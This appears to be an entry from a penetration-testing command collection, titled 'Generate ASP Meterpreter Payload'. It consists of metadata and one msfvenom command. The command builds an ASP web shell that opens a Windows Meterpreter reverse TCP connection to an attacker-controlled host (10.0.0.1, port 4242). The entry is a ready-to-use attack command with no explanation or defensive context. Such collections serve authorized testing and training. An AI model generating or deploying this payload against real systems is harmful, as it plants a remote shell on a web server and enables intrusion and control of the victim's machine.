---
id: 5b1e757d-98ec-4a99-a5be-efcd1e74fc6a
name: Generate ASP Meterpreter Payload
type: command
executor: bash
data: $ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f
  asp > shell.asp
output: null
created_at: '2023-04-06T03:56:24.923520+00:00'
updated_at: '2023-04-10T20:25:33.111197+00:00'
---

# Generate ASP Meterpreter Payload

```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f asp > shell.asp
```


